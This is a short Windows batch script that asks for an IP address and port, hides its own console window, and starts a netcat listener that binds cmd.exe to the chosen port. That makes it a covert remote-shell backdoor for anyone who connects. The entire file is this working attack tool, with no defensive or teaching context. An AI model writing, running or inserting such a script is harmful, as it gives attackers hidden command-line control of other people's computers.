@echo off
@title IP ADDRESS
color 4
mode con: cols=45 lines=4
:path
echo.
set /p ip="ENTER IP ADDRESS:]"
cls
color 3
set /p port="ENTER PORT:]"
@title START SERVER
mode con: cols=0 lines=0
nc %ip% -p %port% -l -e cmd.exe